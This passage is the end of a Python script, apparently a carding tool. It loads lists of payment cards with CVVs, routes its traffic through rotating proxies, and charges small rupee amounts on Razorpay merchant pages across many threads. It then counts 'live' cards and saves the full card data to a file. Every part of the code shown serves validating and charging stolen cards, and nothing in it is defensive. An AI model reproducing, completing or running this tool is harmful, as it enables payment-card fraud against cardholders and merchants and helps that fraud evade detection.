                line = f"{r.get('card', '')}|{r.get('month', '')}|{r.get('year', '')}|{r.get('cvv', '')} — {r.get('status', '')} — ₹{r.get('amount_inr', 0):.2f}\n"
                f.write(line)
    
    json_file = f"{filename}.json"
    with open(json_file, 'w') as f:
        json.dump(results, f, indent=2)
    log(f"Results saved to {json_file}", "SUCCESS")

# ============================================================
# MAIN FUNCTION
# ============================================================

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    # PROXY SETUP
    print(f"{BOLD}{YELLOW}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{YELLOW}║                         PROXY SETUP                               ║{RESET}")
    print(f"{BOLD}{YELLOW}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"{CYAN}  [1] Load from px.txt file")
    print(f"  [2] Manual proxy entry (comma separated)")
    print(f"  [3] No proxy{RESET}")
    
    proxy_choice = input(f"\n{BLUE}Choice: {RESET}").strip()
    proxy_manager = ProxyManager()
    
    if proxy_choice == '1':
        proxy_manager.load_from_file("px.txt")
        if proxy_manager.proxies:
            setup_playwright_proxy(proxy_manager.proxies[0])
    elif proxy_choice == '2':
        proxy_str = input(f"{BLUE}Enter proxies (ip:port or ip:port:user:pass, comma separated): {RESET}").strip()
        if proxy_str:
            proxy_manager.load_from_string(proxy_str)
            setup_playwright_proxy(proxy_str.split(',')[0].strip())
    else:
        log("Running without proxy", "INFO")
    
    # SITE SETUP
    print(f"\n{BOLD}{YELLOW}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{YELLOW}║                         SITE SETUP                                ║{RESET}")
    print(f"{BOLD}{YELLOW}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"{CYAN}  [1] Load from sites.txt file")
    print(f"  [2] Enter sites manually (comma separated)")
    print(f"  [3] Use default sites{RESET}")
    
    site_choice = input(f"\n{BLUE}Choice: {RESET}").strip()
    site_manager = SiteManager()
    
    if site_choice == '1':
        site_manager.load_from_file("sites.txt")
    elif site_choice == '2':
        site_str = input(f"{BLUE}Enter sites (URLs, comma separated): {RESET}").strip()
        if site_str:
            site_manager.load_from_string(site_str)
    else:
        site_manager.load_from_file("sites.txt")
        if not site_manager.sites:
            site_manager.load_from_list(DEFAULT_RAZORPAY_URLS)
    
    site_url = site_manager.get_next()
    log(f"Using site: {site_url}", "INFO")
    
    # AMOUNT SETUP
    print(f"\n{BOLD}{YELLOW}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{YELLOW}║                         AMOUNT SETUP (INR)                         ║{RESET}")
    print(f"{BOLD}{YELLOW}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"{CYAN}  Enter amount in INR (any amount, e.g., 1, 5, 10, 50, 100, 500, 1000)")
    print(f"  Or 'random' for random amount between 1-1000 INR")
    print(f"  Or range like '5-500' for random between")
    print(f"  Or list like '1,5,10,25,50,100' for random pick{RESET}")
    
    amount_input = input(f"\n{BLUE}Amount (default 1): {RESET}").strip() or "1"
    
    if amount_input.lower() == 'random':
        amount_inr = random.uniform(1, 1000)
        amount_paise = int(amount_inr * 100)
    elif '-' in amount_input:
        try:
            low, high = amount_input.split('-')
            low_inr = float(low.strip())
            high_inr = float(high.strip())
            amount_inr = random.uniform(low_inr, high_inr)
            amount_paise = int(amount_inr * 100)
        except:
            amount_paise = 100
    elif ',' in amount_input:
        try:
            options = [float(x.strip()) for x in amount_input.split(',')]
            amount_inr = random.choice(options)
            amount_paise = int(amount_inr * 100)
        except:
            amount_paise = 100
    else:
        try:
            amount_inr = float(amount_input)
            amount_paise = int(amount_inr * 100)
        except:
            amount_paise = 100
    
    log(f"Amount set to: ₹{amount_paise/100:.2f} INR ({amount_paise} paise)", "SUCCESS")
    
    # CARD INPUT
    print(f"\n{BOLD}{YELLOW}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{YELLOW}║                         CARD INPUT MODE                           ║{RESET}")
    print(f"{BOLD}{YELLOW}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"{CYAN}  [1] Single card")
    print(f"  [2] Load from cards.txt file")
    print(f"  [3] Enter cards manually (CC|MM|YY|CVV, one per line){RESET}")
    
    card_choice = input(f"\n{BLUE}Choice: {RESET}").strip()
    cards = []
    
    if card_choice == '1':
        card_input = input(f"{BLUE}Enter card (CC|MM|YY|CVV): {RESET}").strip()
        if card_input:
            cards.append(card_input)
    
    elif card_choice == '2':
        filename = input(f"{BLUE}Card file name (default: cards.txt): {RESET}").strip() or "cards.txt"
        try:
            with open(filename, 'r') as f:
                cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            log(f"Loaded {len(cards)} cards from {filename}", "SUCCESS")
        except FileNotFoundError:
            log(f"File {filename} not found", "ERROR")
            return
    
    elif card_choice == '3':
        print(f"{YELLOW}Enter cards (format: CC|MM|YY|CVV, press Enter twice when done):{RESET}")
        while True:
            line = input().strip()
            if not line and cards:
                break
            if line:
                cards.append(line)
    
    if not cards:
        log("No cards provided!", "ERROR")
        return
    
    # THREAD SETUP
    print(f"\n{BOLD}{YELLOW}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{YELLOW}║                         THREAD SETUP                              ║{RESET}")
    print(f"{BOLD}{YELLOW}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")
    try:
        max_workers = int(input(f"{BLUE}Threads (1-20, default: 5): {RESET}").strip() or "5")
        max_workers = max(1, min(max_workers, 20))
    except:
        max_workers = 5
    
    # START CHECK
    print(f"\n{BOLD}{RED}{'='*60}{RESET}")
    print(f"{BOLD}{RED}STARTING CARD CHECK...{RESET}")
    print(f"{BOLD}{RED}{'='*60}{RESET}\n")
    
    start_time = time.time()
    
    charger = RazorpayCharger(proxy_manager, site_manager)
    result = charger.check_batch(cards, amount_paise, max_workers, site_url)
    
    elapsed = time.time() - start_time
    
    # RESULTS
    print(f"\n{BOLD}{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{GREEN}✅ CHECK COMPLETE!{RESET}")
    print(f"{WHITE}   Total Cards: {result['total']}{RESET}")
    print(f"{GREEN}   ✅ Live/Charged: {result['success']}{RESET}")
    print(f"{RED}   ❌ Declined: {result['failed']}{RESET}")
    print(f"{CYAN}   📊 Success Rate: {(result['success']/result['total']*100):.1f}%{RESET}")
    print(f"{WHITE}   ⏱️ Time: {elapsed:.2f} seconds{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    
    # Show live results
    if result['success'] > 0:
        print(f"\n{BOLD}{GREEN}LIVE CARDS:{RESET}")
        for r in result['results']:
            if r.get('success'):
                print(f"  {GREEN}✓ {r.get('masked', 'Unknown')} | {r.get('status', '')} | ₹{r.get('amount_inr', 0):.2f}{RESET}")
    
    # Save results
    save_choice = input(f"\n{GREEN}Save results to file? (y/n): {RESET}").strip().lower()
    if save_choice == 'y':
        save_results(result['results'])
    
    print(f"\n{GREEN}{BOLD}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}{BOLD}║                      OPERATION COMPLETED                          ║{RESET}")
    print(f"{GREEN}{BOLD}║                      Channel : @dlxdropp                         ║{RESET}")
    print(f"{GREEN}{BOLD}║                      Coder   : @deluxe_cc                        ║{RESET}")
    print(f"{GREEN}{BOLD}║                      Version : 2.0                               ║{RESET}")
    print(f"{GREEN}{BOLD}╚════════════════════════════════════════════════════════════════════╝{RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️ Operation cancelled by user.{RESET}")
    except Exception as e:
        print(f"{RED}\n❌ Unexpected error: {e}{RESET}")
        traceback.print_exc()